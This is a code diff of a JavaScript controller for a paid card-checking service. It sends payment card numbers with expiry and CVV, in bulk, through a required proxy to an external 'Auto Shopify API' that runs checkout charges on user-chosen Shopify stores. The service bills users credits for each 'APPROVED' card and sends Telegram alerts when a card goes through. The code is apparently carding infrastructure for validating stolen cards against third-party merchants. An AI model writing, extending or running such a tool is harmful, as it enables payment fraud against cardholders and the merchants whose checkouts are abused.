@@ -1,9 +1,9 @@
 /**
  * Shopify Charge Controller
- * Handles Shopify checkout card validation
- * Site configs are server-side - client just selects which gateway
+ * Handles Shopify checkout card validation via Auto Shopify API
+ * User provides the Shopify site URL for validation
  * 
- * Credit Billing: Shopify charge gateways use pricing_live per passed card
+ * API: https://autoshopi.up.railway.app/?cc=cc&url=site&proxy=proxy
  */
 export class ShopifyChargeController {
     constructor(options = {}) {
@@ -13,120 +13,25 @@ export class ShopifyChargeController {
     }
 
     /**
-     * GET /api/shopify/sites
-     * Get available Shopify sites (only configured ones)
-     */
-    getSites(req, res) {
-        const sites = this.shopifyChargeService.getAvailableSites();
-        res.json({ status: 'OK', sites });
-    }
-
-    /**
-     * GET /api/shopify/all-sites
-     * Get all Shopify sites (including unconfigured)
-     */
-    getAllSites(req, res) {
-        const sites = this.shopifyChargeService.getAllSites();
-        res.json({ status: 'OK', sites });
-    }
-
-    /**
-     * POST /api/shopify/site
-     * Set active Shopify site
-     */
-    setSite(req, res) {
-        const { siteId } = req.body;
-        if (!siteId) {
-            return res.status(400).json({ status: 'ERROR', message: 'siteId is required' });
-        }
-        const success = this.shopifyChargeService.setSite(siteId);
-        if (!success) {
-            return res.status(404).json({ status: 'ERROR', message: `Site not found: ${siteId}` });
-        }
-        res.json({ status: 'OK', message: `Switched to site: ${siteId}` });
-    }
-
-    /**
-     * POST /api/shopify/update-site
-     * Update site configuration (hot reload)
-     */
-    updateSite(req, res) {
-        const { siteId, config } = req.body;
-        if (!siteId || !config) {
-            return res.status(400).json({ status: 'ERROR', message: 'siteId and config are required' });
-        }
-
-        const allowedFields = ['domain', 'prodUrl', 'prodId', 'label', 'customAddress'];
-        const filteredConfig = {};
-        for (const field of allowedFields) {
-            if (config[field] !== undefined) {
-                filteredConfig[field] = config[field];
-            }
-        }
-
-        const success = this.shopifyChargeService.updateSiteConfig(siteId, filteredConfig);
-        if (!success) {
-            return res.status(404).json({ status: 'ERROR', message: `Site not found: ${siteId}` });
-        }
-
-        res.json({ status: 'OK', message: `Site ${siteId} updated`, config: filteredConfig });
-    }
-
-    /**
      * POST /api/shopify/check
      * Check a single card via Shopify checkout
      */
     async checkCard(req, res) {
         try {
-            const { card } = req.body;
+            const { card, shopifyUrl } = req.body;
 
             if (!card) {
                 return res.status(400).json({ status: 'ERROR', message: 'Card data is required (format: number|mm|yy|cvv)' });
             }
 
+            if (!shopifyUrl) {
+                return res.status(400).json({ status: 'ERROR', message: 'Shopify URL is required' });
+            }
+
+            this.shopifyChargeService.setShopifyUrl(shopifyUrl);
             const result = await this.shopifyChargeService.processCard(card);
             res.json(result.toJSON ? result.toJSON() : result);
         } catch (error) {
-
-            res.status(500).json({ status: 'ERROR', message: error.message });
-        }
-    }
-
-    /**
-     * POST /api/shopify/batch
-     * Check multiple cards via Shopify checkout
-     * 
-     * Requirements: 3.1, 3.2, 3.3, 3.4 - Uses tier-based speed limits
-     */
-    async checkBatch(req, res) {
-        try {
-            const { cards, cardList, concurrency = 2 } = req.body;
-            
-            // Get user tier from authenticated request (Requirement 3.1)
-            const tier = req.user?.tier || 'free';
-
-            let cardArray = cards;
-            if (!cardArray && cardList) {
-                cardArray = cardList.split('\n')
-                    .map(line => line.trim())
-                    .filter(line => line && line.includes('|'));
-            }
-
-            if (!cardArray || cardArray.length === 0) {
-                return res.status(400).json({ status: 'ERROR', message: 'No valid cards provided' });
-            }
-
-            const result = await this.shopifyChargeService.processBatch(
-                cardArray,
-                { 
-                    concurrency: Math.min(concurrency, 3), // Lower max concurrency for Shopify
-                    tier // Pass tier for speed limiting (Requirement 3.1)
-                }
-            );
-
-            res.json({ status: 'OK', ...result });
-        } catch (error) {
-
             res.status(500).json({ status: 'ERROR', message: error.message });
         }
     }
@@ -134,20 +39,22 @@ export class ShopifyChargeController {
     /**
      * POST /api/shopify/batch-stream
      * Check multiple cards with SSE progress
-     * 
-     * Requirements: 3.1, 3.2, 3.3, 3.4 - Uses tier-based speed limits
      */
     async checkBatchStream(req, res) {
-        const requestId = `shopify_${Date.now()}`;
-        const { cards, cardList, concurrency = 2, siteId } = req.body;
-        
-        // Get user tier from authenticated request (Requirement 3.1)
+        const { cards, cardList, concurrency = 2, shopifyUrl, proxy } = req.body;
         const tier = req.user?.tier || 'free';
 
-        // Set site if provided
-        if (siteId) {
-            this.shopifyChargeService.setSite(siteId);
+        if (!shopifyUrl) {
+            return res.status(400).json({ status: 'ERROR', message: 'Shopify URL is required' });
         }
+
+        if (!proxy) {
+            return res.status(400).json({ status: 'ERROR', message: 'Proxy is required for Auto Shopify API' });
+        }
+
+        // Set the Shopify URL and proxy
+        this.shopifyChargeService.setShopifyUrl(shopifyUrl);
+        this.shopifyChargeService.setProxy(proxy);
 
         let cardArray = cards;
         if (!cardArray && cardList) {
@@ -160,29 +67,24 @@ export class ShopifyChargeController {
             return res.status(400).json({ status: 'ERROR', message: 'No valid cards provided' });
         }
 
-        // Setup SSE with proper error handling
+        // Setup SSE
         res.setHeader('Content-Type', 'text/event-stream');
         res.setHeader('Cache-Control', 'no-cache');
         res.setHeader('Connection', 'keep-alive');
         res.setHeader('X-Accel-Buffering', 'no');
         
-        // Track if stream is still open
         let streamClosed = false;
         
-        // Handle client disconnect
         req.on('close', () => {
-
             streamClosed = true;
             this.shopifyChargeService?.stopBatch();
         });
         
-        req.on('error', (err) => {
-
+        req.on('error', () => {
             streamClosed = true;
         });
         
-        res.on('error', (err) => {
-
+        res.on('error', () => {
             streamClosed = true;
         });
         
@@ -190,65 +92,61 @@ export class ShopifyChargeController {
 
         let resultCount = 0;
         const sendEvent = (event, data) => {
-            if (streamClosed) {
-
-                return;
-            }
+            if (streamClosed) return;
             try {
-                if (event === 'result') {
-                    resultCount++;
-
-                }
+                if (event === 'result') resultCount++;
                 res.write(`event: ${event}\ndata: ${JSON.stringify(data)}\n\n`);
             } catch (e) {
-
                 streamClosed = true;
             }
         };
 
-        sendEvent('start', { total: cardArray.length, concurrency, tier });
+        sendEvent('start', { total: cardArray.length, concurrency, tier, shopifyUrl });
 
         const userId = req.user?.id;
-        const gatewayId = req.creditInfo?.gatewayId || siteId || 'shopify';
+        const gatewayId = 'auto-shopify-1';
         
-        // Track live deduction for real-time credit checking
         let totalCreditsDeducted = 0;
         let currentBalance = req.creditInfo?.currentBalance || 0;
         let creditExhausted = false;
+        let approvedCount = 0;
+        let liveCount = 0;
+        let processedCards = 0;
 
         try {
             const result = await this.shopifyChargeService.processBatch(
                 cardArray,
                 {
-                    concurrency: Math.min(concurrency, 3),
-                    tier, // Pass tier for speed limiting (Requirement 3.1)
+                    concurrency: Math.min(concurrency, 5),
+                    tier,
+                    shopifyUrl,
+                    userId, // Pass userId for statistics tracking (Requirements 8.1, 8.2)
                     onProgress: (progress) => sendEvent('progress', progress),
                     onResult: async (result) => {
                         if (streamClosed || creditExhausted) return;
                         
-                        // For LIVE cards (APPROVED in shopify auth), deduct credits in real-time
+                        processedCards++;
+                        
+                        // For APPROVED cards (charge), deduct credits
                         if (result.status === 'APPROVED' && userId && this.creditManagerService) {
+                            liveCount++;
+                            
                             const deductResult = await this.creditManagerService.deductSingleCardCredit(
                                 userId,
                                 gatewayId,
-                                'live' // Shopify Auth uses pricing_live
+                                'live'
                             );
                             
                             if (deductResult.success) {
                                 totalCreditsDeducted += deductResult.creditsDeducted;
                                 currentBalance = deductResult.newBalance;
-                                // Include newBalance in result for live frontend update
                                 result.newBalance = deductResult.newBalance;
                                 result.creditsDeducted = deductResult.creditsDeducted;
                             } else if (deductResult.shouldStop) {
-                                // Credits exhausted - stop the batch
                                 creditExhausted = true;
                                 currentBalance = deductResult.currentBalance;
-
-                                // Stop the batch processing
                                 this.shopifyChargeService.stopBatch();
                                 
-                                // Send credit exhausted event
                                 sendEvent('credit_exhausted', {
                                     message: 'Credits exhausted - batch stopped',
                                     balance: currentBalance,
@@ -257,12 +155,12 @@ export class ShopifyChargeController {
                                 });
                             }
 
-                            // Send Telegram notification for approved cards
+                            // Telegram notification for approved cards
                             if (this.telegramBotService && result.status === 'APPROVED') {
                                 this.telegramBotService.notifyCardApproved({
                                     user: req.user,
                                     result,
-                                    gateway: siteId || 'shopify',
+                                    gateway: 'auto-shopify',
                                     type: 'shopify'
                                 }).catch(() => {});
                             }
@@ -273,17 +171,34 @@ export class ShopifyChargeController {
                 }
             );
 
-            const liveCount = result.stats?.approved || 0;
+            const wasUserStopped = result.aborted === true;
+            const wasStopped = creditExhausted || wasUserStopped;
+            let stopReason = null;
+            if (creditExhausted) stopReason = 'credit_exhausted';
+            else if (wasUserStopped) stopReason = 'user_cancelled';
 
-            // Credits already deducted per-card in real-time, no batch deduction needed
-            if (totalCreditsDeducted > 0) {
-
+            // Record batch transaction (only when credits were deducted)
+            if (userId && this.creditManagerService && totalCreditsDeducted > 0) {
+                try {
+                    await this.creditManagerService.recordBatchTransaction(userId, gatewayId, {
+                        totalCreditsDeducted,
+                        approvedCount,
+                        liveCount,
+                        totalCards: cardArray.length,
+                        processedCards,
+                        currentBalance,
+                        wasStopped,
+                        stopReason
+                    });
+                } catch (err) {
+                    console.error('[ShopifyChargeController] Failed to record batch transaction:', err.message);
+                }
             }
 
             // Release operation lock
             if (userId && this.creditManagerService) {
                 try {
-                    await this.creditManagerService.releaseOperationLockByUser(userId, creditExhausted ? 'credit_exhausted' : 'completed');
+                    await this.creditManagerService.releaseOperationLockByUser(userId, stopReason);
                 } catch {}
             }
 
@@ -294,7 +209,22 @@ export class ShopifyChargeController {
                 creditExhausted
             });
         } catch (error) {
-            // Release lock on error
+            // Record transaction on error if any credits were deducted
+            if (userId && this.creditManagerService && totalCreditsDeducted > 0) {
+                try {
+                    await this.creditManagerService.recordBatchTransaction(userId, gatewayId, {
+                        totalCreditsDeducted,
+                        approvedCount,
+                        liveCount,
+                        totalCards: cardArray.length,
+                        processedCards,
+                        currentBalance,
+                        wasStopped: true,
+                        stopReason: 'error'
+                    });
+                } catch {}
+            }
+            
             if (userId && this.creditManagerService) {
                 try {
                     await this.creditManagerService.releaseOperationLockByUser(userId, 'failed');
@@ -306,9 +236,7 @@ export class ShopifyChargeController {
         if (!streamClosed) {
             try {
                 res.end();
-            } catch (e) {
-
-            }
+            } catch (e) {}
         }
     }
 
@@ -321,14 +249,10 @@ export class ShopifyChargeController {
 
         this.shopifyChargeService.stopBatch();
 
-        // Release operation lock so user can start new validation
         if (userId && this.creditManagerService) {
             try {
                 await this.creditManagerService.releaseOperationLockByUser(userId, 'cancelled');
-
-            } catch (err) {
-
-            }
+            } catch (err) {}
         }
 
         res.json({ status: 'OK', message: 'Stop signal sent' });
@@ -339,12 +263,7 @@ export class ShopifyChargeController {
      */
     getRoutes() {
         return {
-            getSites: this.getSites.bind(this),
-            getAllSites: this.getAllSites.bind(this),
-            setSite: this.setSite.bind(this),
-            updateSite: this.updateSite.bind(this),
             checkCard: this.checkCard.bind(this),
-            checkBatch: this.checkBatch.bind(this),
             checkBatchStream: this.checkBatchStream.bind(this),
             stopBatch: this.stopBatch.bind(this)
         };
